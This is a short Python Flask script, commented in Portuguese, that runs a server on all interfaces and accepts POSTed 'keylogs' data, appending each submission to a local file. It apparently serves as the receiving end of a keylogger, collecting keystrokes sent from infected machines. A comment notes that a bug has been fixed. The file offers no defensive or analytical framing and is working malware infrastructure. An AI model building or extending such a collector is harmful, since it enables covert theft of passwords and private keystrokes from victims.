from flask import Flask, request

app = Flask(__name__)

@app.route('/receber_dados', methods=['POST'])
def receber_dados():
    keylogs = request.form.get('keylogs')  # Corrigido "from" para "form"
    if keylogs:  # Verifica se os dados foram recebidos corretamente
        with open("keylogs_recebidos.txt", "a") as f:
            f.write(keylogs + "\n")
        return "Dados Recebidos", 200
    return "Erro: Nenhum dado recebido", 400  # Retorna erro se não receber nada

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
